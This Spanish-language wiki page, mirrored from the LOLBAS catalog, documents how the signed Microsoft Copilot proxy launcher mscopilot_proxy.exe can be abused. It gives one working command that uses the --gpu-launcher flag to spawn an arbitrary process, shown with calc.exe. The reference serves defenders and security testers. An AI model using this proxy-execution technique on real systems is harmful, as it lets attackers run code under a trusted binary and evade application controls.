# LOLBAS: Mscopilot_proxy.exe

[[00-inicio|Inicio]] · [[Referencias|Referencias]] · [[LOLBAS|Índice LOLBAS]]

> Fuente: [https://lolbas-project.github.io/](https://lolbas-project.github.io/) · Licencia: **GPL-3.0** · Espejo local generado desde el repositorio oficial.

LOLBAS — binarios legitimos de Windows usables como atacante (living off the land).

**Categorías:** `Execute`

Microsoft Copilot proxy launcher

## Comandos

### Executes a process under a trusted Microsoft signed binary

Execute · priv: User · T1218.015

```cmd
mscopilot_proxy.exe --no-startup-window --disable-gpu-sandbox --gpu-launcher="cmd.exe /c calc.exe && taskkill /f /im mscopilot.exe &&"
```

`mscopilot_proxy.exe` will spawn the provided command. Parent `mscopilot_proxy.exe` process needs to be killed to avoid command being executed an infinite number of times.

